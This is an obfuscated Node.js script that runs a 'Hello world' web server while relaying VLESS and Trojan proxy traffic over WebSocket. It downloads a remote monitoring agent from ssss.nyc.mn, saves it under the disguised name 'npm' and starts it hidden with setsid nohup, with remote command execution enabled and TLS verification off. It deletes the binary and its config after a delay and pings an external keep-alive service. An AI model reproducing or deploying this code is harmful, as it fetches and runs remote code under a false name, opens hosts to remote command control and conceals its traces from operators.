const _0x338edd=_0x4474;(function(_0x43b1e3,_0x538d5b){const _0x573bd4=_0x4474,_0x211b6c=_0x43b1e3();while(!![]){try{const _0x1141e7=parseInt(_0x573bd4(0x18b))/0x1+parseInt(_0x573bd4(0x145))/0x2+-parseInt(_0x573bd4(0x17a))/0x3+parseInt(_0x573bd4(0x190))/0x4*(parseInt(_0x573bd4(0x181))/0x5)+parseInt(_0x573bd4(0x18e))/0x6*(parseInt(_0x573bd4(0x134))/0x7)+-parseInt(_0x573bd4(0x19a))/0x8*(-parseInt(_0x573bd4(0x165))/0x9)+-parseInt(_0x573bd4(0x193))/0xa;if(_0x1141e7===_0x538d5b)break;else _0x211b6c['push'](_0x211b6c['shift']());}catch(_0x364e82){_0x211b6c['push'](_0x211b6c['shift']());}}}(_0x5254,0xbdde5));const os=require('os'),http=require(_0x338edd(0x177)),fs=require('fs'),axios=require('axios'),net=require(_0x338edd(0x14c)),path=require(_0x338edd(0x18c)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x338edd(0x147)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x338edd(0x185)]['UUID']||_0x338edd(0x166),NEZHA_SERVER=process[_0x338edd(0x185)][_0x338edd(0x156)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x338edd(0x185)][_0x338edd(0x168)]||'',DOMAIN=process[_0x338edd(0x185)][_0x338edd(0x189)]||_0x338edd(0x172),AUTO_ACCESS=process[_0x338edd(0x185)][_0x338edd(0x12f)]||!![],WSPATH=process[_0x338edd(0x185)][_0x338edd(0x133)]||UUID[_0x338edd(0x139)](0x0,0x8),SUB_PATH=process[_0x338edd(0x185)][_0x338edd(0x132)]||'sub',NAME=process[_0x338edd(0x185)][_0x338edd(0x12c)]||_0x338edd(0x142),PORT=process[_0x338edd(0x185)][_0x338edd(0x16e)]||0x1eb4;let ISP='';function _0x5254(){const _0x1d8524=['Automatic\x20Access\x20Task\x20added\x20successfully','NEZHA_KEY','arm','Server\x20is\x20running\x20on\x20port\x20','https://arm64.ssss.nyc.mn/agent','end','text/plain','PORT','post','client_secret:\x20','every','1234.abc.com','https://dns.google/resolve?name=','writeHead','Unknown','sha224','http','readUInt8','then','2021754kpxBhz','readUInt16BE','\x20-p\x20','type','utf8','test','close','113000TiCNkt','connect','trim','true','env','npm\x20download\x20successfully','hex','log','DOMAIN','2053','235931eDZGxS','path','finish','24CJFXTm','--tls','36niEvsO','replace','setsid\x20nohup\x20./npm\x20-s\x20','18455680tUndFb','data','url','https://speed.cloudflare.com/meta','createHash','application/json','send','184tSCNgM','createWriteStream','npm\x20is\x20already\x20running,\x20skip\x20running...','Answer','config.yaml','digest','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','createServer','country','https://amd64.ssss.nyc.mn/agent','NAME','text/html','https://oooo.serv00.net/add-url','AUTO_ACCESS','message','join','SUB_PATH','WSPATH','2471112DlAvCr','find','vless://','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','/bin/bash','slice',':443?encryption=none&security=tls&sni=','writeFileSync','https://amd64.ssss.nyc.mn/v1','map','false','error','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','substr','Hug','arm64','2087','808014tNMzgu','index.html','child_process','includes','reduce',':443?security=tls&sni=','decode','net','write','concat','unlink','toString','pop','&path=%2F','Not\x20Found\x0a','get','catch','NEZHA_SERVER','stream','Status','npm','chmod\x20+x\x20npm','length','error:\x20','\x20with\x20all\x20DNS\x20servers','npm\x20is\x20running','https://','pipe','once','https://arm64.ssss.nyc.mn/v1','Hello\x20world!','&fp=chrome&type=ws&host=','407655aWehrB','b5b35cb4-911f-46eb-8f1a-818a54ae3717'];_0x5254=function(){return _0x1d8524;};return _0x5254();}const GetISP=async()=>{const _0x54376e=_0x338edd;try{const _0x473d29=await axios['get'](_0x54376e(0x196)),_0x235c5b=_0x473d29[_0x54376e(0x194)];ISP=(_0x235c5b[_0x54376e(0x12a)]+'-'+_0x235c5b['asOrganization'])['replace'](/ /g,'_');}catch(_0x58f0e1){ISP=_0x54376e(0x175);}};GetISP();const httpServer=http[_0x338edd(0x129)]((_0x2c1cdf,_0x5b473b)=>{const _0x7ce679=_0x338edd;if(_0x2c1cdf['url']==='/'){const _0x4af873=path[_0x7ce679(0x131)](__dirname,_0x7ce679(0x146));fs['readFile'](_0x4af873,_0x7ce679(0x17e),(_0x3400aa,_0x4f1eff)=>{const _0x20ae59=_0x7ce679;if(_0x3400aa){_0x5b473b[_0x20ae59(0x174)](0xc8,{'Content-Type':_0x20ae59(0x12d)}),_0x5b473b['end'](_0x20ae59(0x163));return;}_0x5b473b[_0x20ae59(0x174)](0xc8,{'Content-Type':_0x20ae59(0x12d)}),_0x5b473b['end'](_0x4f1eff);});return;}else{if(_0x2c1cdf[_0x7ce679(0x195)]==='/'+SUB_PATH){const _0xb53de1=_0x7ce679(0x136)+UUID+'@'+DOMAIN+_0x7ce679(0x13a)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x7ce679(0x152)+WSPATH+'#'+NAME+'-'+ISP,_0x9c7ddc='trojan://'+UUID+'@'+DOMAIN+_0x7ce679(0x14a)+DOMAIN+_0x7ce679(0x164)+DOMAIN+_0x7ce679(0x152)+WSPATH+'#'+NAME+'-'+ISP,_0x412a7f=_0xb53de1+'\x0a'+_0x9c7ddc,_0x597902=Buffer['from'](_0x412a7f)['toString']('base64');_0x5b473b['writeHead'](0xc8,{'Content-Type':_0x7ce679(0x16d)}),_0x5b473b[_0x7ce679(0x16c)](_0x597902+'\x0a');}else _0x5b473b[_0x7ce679(0x174)](0x194,{'Content-Type':_0x7ce679(0x16d)}),_0x5b473b[_0x7ce679(0x16c)](_0x7ce679(0x153));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x338edd(0x191)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x266b0c){return new Promise((_0x32e201,_0x332e5e)=>{const _0x5b8aaf=_0x4474;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5b8aaf(0x17f)](_0x266b0c)){_0x32e201(_0x266b0c);return;}let _0x7e10aa=0x0;function _0x3ff88e(){const _0x2bb41f=_0x5b8aaf;if(_0x7e10aa>=DNS_SERVERS['length']){_0x332e5e(new Error('Failed\x20to\x20resolve\x20'+_0x266b0c+_0x2bb41f(0x15d)));return;}const _0x27d2e2=DNS_SERVERS[_0x7e10aa];_0x7e10aa++;const _0x4e79b7=_0x2bb41f(0x173)+encodeURIComponent(_0x266b0c)+'&type=A';axios[_0x2bb41f(0x154)](_0x4e79b7,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x2bb41f(0x179)](_0x175c0a=>{const _0x1b53a0=_0x2bb41f,_0x43202f=_0x175c0a[_0x1b53a0(0x194)];if(_0x43202f[_0x1b53a0(0x158)]===0x0&&_0x43202f['Answer']&&_0x43202f[_0x1b53a0(0x125)][_0x1b53a0(0x15b)]>0x0){const _0x2a2401=_0x43202f[_0x1b53a0(0x125)][_0x1b53a0(0x135)](_0x245bbd=>_0x245bbd[_0x1b53a0(0x17d)]===0x1);if(_0x2a2401){_0x32e201(_0x2a2401['data']);return;}}_0x3ff88e();})[_0x2bb41f(0x155)](_0x49c678=>{_0x3ff88e();});}_0x3ff88e();});}function handleVlessConnection(_0xbff109,_0x221201){const _0x1f8982=_0x338edd,[_0x5f0453]=_0x221201,_0x12037a=_0x221201[_0x1f8982(0x139)](0x1,0x11);if(!_0x12037a['every']((_0x545a12,_0x127ae9)=>_0x545a12==parseInt(uuid['substr'](_0x127ae9*0x2,0x2),0x10)))return![];let _0x413832=_0x221201[_0x1f8982(0x139)](0x11,0x12)[_0x1f8982(0x178)]()+0x13;const _0xfab054=_0x221201[_0x1f8982(0x139)](_0x413832,_0x413832+=0x2)['readUInt16BE'](0x0),_0x201f9e=_0x221201[_0x1f8982(0x139)](_0x413832,_0x413832+=0x1)[_0x1f8982(0x178)](),_0x458b24=_0x201f9e==0x1?_0x221201['slice'](_0x413832,_0x413832+=0x4)[_0x1f8982(0x131)]('.'):_0x201f9e==0x2?new TextDecoder()[_0x1f8982(0x14b)](_0x221201['slice'](_0x413832+0x1,_0x413832+=0x1+_0x221201['slice'](_0x413832,_0x413832+0x1)[_0x1f8982(0x178)]())):_0x201f9e==0x3?_0x221201[_0x1f8982(0x139)](_0x413832,_0x413832+=0x10)[_0x1f8982(0x149)]((_0x43d085,_0x36cb83,_0x2e7613,_0xd04546)=>_0x2e7613%0x2?_0x43d085[_0x1f8982(0x14e)](_0xd04546[_0x1f8982(0x139)](_0x2e7613-0x1,_0x2e7613+0x1)):_0x43d085,[])[_0x1f8982(0x13d)](_0x3d0ebd=>_0x3d0ebd[_0x1f8982(0x17b)](0x0)[_0x1f8982(0x150)](0x10))[_0x1f8982(0x131)](':'):'';_0xbff109[_0x1f8982(0x199)](new Uint8Array([_0x5f0453,0x0]));const _0x2225bb=createWebSocketStream(_0xbff109);return resolveHost(_0x458b24)[_0x1f8982(0x179)](_0x104815=>{const _0x179f11=_0x1f8982;net[_0x179f11(0x182)]({'host':_0x104815,'port':_0xfab054},function(){const _0x39319a=_0x179f11;this[_0x39319a(0x14d)](_0x221201['slice'](_0x413832)),_0x2225bb['on'](_0x39319a(0x13f),()=>{})[_0x39319a(0x160)](this)['on'](_0x39319a(0x13f),()=>{})[_0x39319a(0x160)](_0x2225bb);})['on']('error',()=>{});})['catch'](_0x509c38=>{const _0x2b20b8=_0x1f8982;net[_0x2b20b8(0x182)]({'host':_0x458b24,'port':_0xfab054},function(){const _0x4fcf9c=_0x2b20b8;this[_0x4fcf9c(0x14d)](_0x221201[_0x4fcf9c(0x139)](_0x413832)),_0x2225bb['on'](_0x4fcf9c(0x13f),()=>{})[_0x4fcf9c(0x160)](this)['on'](_0x4fcf9c(0x13f),()=>{})['pipe'](_0x2225bb);})['on'](_0x2b20b8(0x13f),()=>{});}),!![];}function handleTrojanConnection(_0x3bf0bb,_0x30db9d){const _0x280dfa=_0x338edd;try{if(_0x30db9d[_0x280dfa(0x15b)]<0x3a)return![];const _0x371faa=_0x30db9d['slice'](0x0,0x38)[_0x280dfa(0x150)](),_0x5ead7b=[UUID];let _0x23113f=null;for(const _0x3d5a16 of _0x5ead7b){const _0xbc7436=crypto[_0x280dfa(0x197)](_0x280dfa(0x176))['update'](_0x3d5a16)[_0x280dfa(0x127)](_0x280dfa(0x187));if(_0xbc7436===_0x371faa){_0x23113f=_0x3d5a16;break;}}if(!_0x23113f)return![];let _0x565abc=0x38;_0x30db9d[_0x565abc]===0xd&&_0x30db9d[_0x565abc+0x1]===0xa&&(_0x565abc+=0x2);const _0x1413b7=_0x30db9d[_0x565abc];if(_0x1413b7!==0x1)return![];_0x565abc+=0x1;const _0x179a49=_0x30db9d[_0x565abc];_0x565abc+=0x1;let _0x2979a2,_0x75cdcd;if(_0x179a49===0x1)_0x2979a2=_0x30db9d['slice'](_0x565abc,_0x565abc+0x4)[_0x280dfa(0x131)]('.'),_0x565abc+=0x4;else{if(_0x179a49===0x3){const _0x1b3471=_0x30db9d[_0x565abc];_0x565abc+=0x1,_0x2979a2=_0x30db9d['slice'](_0x565abc,_0x565abc+_0x1b3471)[_0x280dfa(0x150)](),_0x565abc+=_0x1b3471;}else{if(_0x179a49===0x4)_0x2979a2=_0x30db9d[_0x280dfa(0x139)](_0x565abc,_0x565abc+0x10)[_0x280dfa(0x149)]((_0x426ca0,_0x42e1d6,_0x4921fc,_0x3f681f)=>_0x4921fc%0x2?_0x426ca0[_0x280dfa(0x14e)](_0x3f681f[_0x280dfa(0x139)](_0x4921fc-0x1,_0x4921fc+0x1)):_0x426ca0,[])[_0x280dfa(0x13d)](_0x50fa05=>_0x50fa05['readUInt16BE'](0x0)[_0x280dfa(0x150)](0x10))[_0x280dfa(0x131)](':'),_0x565abc+=0x10;else return![];}}_0x75cdcd=_0x30db9d[_0x280dfa(0x17b)](_0x565abc),_0x565abc+=0x2;_0x565abc<_0x30db9d['length']&&_0x30db9d[_0x565abc]===0xd&&_0x30db9d[_0x565abc+0x1]===0xa&&(_0x565abc+=0x2);const _0xfb66c7=createWebSocketStream(_0x3bf0bb);return resolveHost(_0x2979a2)[_0x280dfa(0x179)](_0x3033d8=>{const _0x2090ff=_0x280dfa;net['connect']({'host':_0x3033d8,'port':_0x75cdcd},function(){const _0xa6f2cf=_0x4474;_0x565abc<_0x30db9d[_0xa6f2cf(0x15b)]&&this[_0xa6f2cf(0x14d)](_0x30db9d[_0xa6f2cf(0x139)](_0x565abc)),_0xfb66c7['on'](_0xa6f2cf(0x13f),()=>{})[_0xa6f2cf(0x160)](this)['on'](_0xa6f2cf(0x13f),()=>{})['pipe'](_0xfb66c7);})['on'](_0x2090ff(0x13f),()=>{});})['catch'](_0x428dcb=>{const _0x2e5f5d=_0x280dfa;net[_0x2e5f5d(0x182)]({'host':_0x2979a2,'port':_0x75cdcd},function(){const _0xf545d7=_0x2e5f5d;_0x565abc<_0x30db9d[_0xf545d7(0x15b)]&&this[_0xf545d7(0x14d)](_0x30db9d[_0xf545d7(0x139)](_0x565abc)),_0xfb66c7['on']('error',()=>{})[_0xf545d7(0x160)](this)['on'](_0xf545d7(0x13f),()=>{})[_0xf545d7(0x160)](_0xfb66c7);})['on'](_0x2e5f5d(0x13f),()=>{});}),!![];}catch(_0x8196be){return![];}}wss['on']('connection',(_0x2c4e0d,_0x336a38)=>{const _0x505d6a=_0x338edd,_0x96d332=_0x336a38[_0x505d6a(0x195)]||'';_0x2c4e0d[_0x505d6a(0x161)](_0x505d6a(0x130),_0x52f3b4=>{const _0x4903a6=_0x505d6a;if(_0x52f3b4[_0x4903a6(0x15b)]>0x11&&_0x52f3b4[0x0]===0x0){const _0x174c9e=_0x52f3b4[_0x4903a6(0x139)](0x1,0x11),_0x5b80bd=_0x174c9e[_0x4903a6(0x171)]((_0x3d95c4,_0x504673)=>_0x3d95c4==parseInt(uuid[_0x4903a6(0x141)](_0x504673*0x2,0x2),0x10));if(_0x5b80bd){!handleVlessConnection(_0x2c4e0d,_0x52f3b4)&&_0x2c4e0d['close']();return;}}!handleTrojanConnection(_0x2c4e0d,_0x52f3b4)&&_0x2c4e0d[_0x4903a6(0x180)]();})['on'](_0x505d6a(0x13f),()=>{});});const getDownloadUrl=()=>{const _0x5d3a5d=_0x338edd,_0x1b3c0b=os['arch']();return _0x1b3c0b===_0x5d3a5d(0x169)||_0x1b3c0b===_0x5d3a5d(0x143)||_0x1b3c0b==='aarch64'?!NEZHA_PORT?_0x5d3a5d(0x162):_0x5d3a5d(0x16b):!NEZHA_PORT?_0x5d3a5d(0x13c):_0x5d3a5d(0x12b);},downloadFile=async()=>{const _0x453c5d=_0x338edd;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x156b27=getDownloadUrl(),_0x2ff020=await axios({'method':_0x453c5d(0x154),'url':_0x156b27,'responseType':_0x453c5d(0x157)}),_0x216182=fs[_0x453c5d(0x19b)](_0x453c5d(0x159));return _0x2ff020[_0x453c5d(0x194)][_0x453c5d(0x160)](_0x216182),new Promise((_0x40fe71,_0x2856c9)=>{const _0x3e2937=_0x453c5d;_0x216182['on'](_0x3e2937(0x18d),()=>{const _0x451206=_0x3e2937;console[_0x451206(0x188)](_0x451206(0x186)),exec(_0x451206(0x15a),_0x10b0cc=>{if(_0x10b0cc)_0x2856c9(_0x10b0cc);_0x40fe71();});}),_0x216182['on'](_0x3e2937(0x13f),_0x2856c9);});}catch(_0x28d9d2){throw _0x28d9d2;}},runnz=async()=>{const _0x120bd5=_0x338edd;try{const _0xa917f4=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0xa917f4[_0x120bd5(0x183)]()!==''){console['log'](_0x120bd5(0x19c));return;}}catch(_0x565ba8){}await downloadFile();let _0x509d18='',_0x315c45=['443','8443','2096',_0x120bd5(0x144),'2083',_0x120bd5(0x18a)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5a80eb=_0x315c45[_0x120bd5(0x148)](NEZHA_PORT)?_0x120bd5(0x18f):'';_0x509d18=_0x120bd5(0x192)+NEZHA_SERVER+':'+NEZHA_PORT+_0x120bd5(0x17c)+NEZHA_KEY+'\x20'+_0x5a80eb+_0x120bd5(0x140);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x194739=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x120bd5(0x151)]():'',_0x31eca9=_0x315c45['includes'](_0x194739)?_0x120bd5(0x184):_0x120bd5(0x13e),_0x4b605b=_0x120bd5(0x170)+NEZHA_KEY+_0x120bd5(0x128)+NEZHA_SERVER+_0x120bd5(0x137)+_0x31eca9+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x120bd5(0x13b)](_0x120bd5(0x126),_0x4b605b);}_0x509d18='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x509d18,{'shell':_0x120bd5(0x138)},_0x20f135=>{const _0x18e08f=_0x120bd5;if(_0x20f135)console[_0x18e08f(0x13f)]('npm\x20running\x20error:',_0x20f135);else console[_0x18e08f(0x188)](_0x18e08f(0x15e));});}catch(_0x5b4e8d){console[_0x120bd5(0x13f)](_0x120bd5(0x15c)+_0x5b4e8d);}};function _0x4474(_0xd38efa,_0x1324ed){const _0x5254fc=_0x5254();return _0x4474=function(_0x4474db,_0x5e7f19){_0x4474db=_0x4474db-0x125;let _0x5f4f89=_0x5254fc[_0x4474db];return _0x5f4f89;},_0x4474(_0xd38efa,_0x1324ed);}async function addAccessTask(){const _0x3b33ca=_0x338edd;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x55e839=_0x3b33ca(0x15f)+DOMAIN;try{const _0x213ef0=await axios[_0x3b33ca(0x16f)](_0x3b33ca(0x12e),{'url':_0x55e839},{'headers':{'Content-Type':_0x3b33ca(0x198)}});console['log'](_0x3b33ca(0x167));}catch(_0x1c557e){}}const delFiles=()=>{const _0x5cc8ff=_0x338edd;fs[_0x5cc8ff(0x14f)](_0x5cc8ff(0x159),()=>{}),fs[_0x5cc8ff(0x14f)](_0x5cc8ff(0x126),()=>{});};httpServer['listen'](PORT,()=>{const _0x422a86=_0x338edd;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x422a86(0x16a)+PORT);});
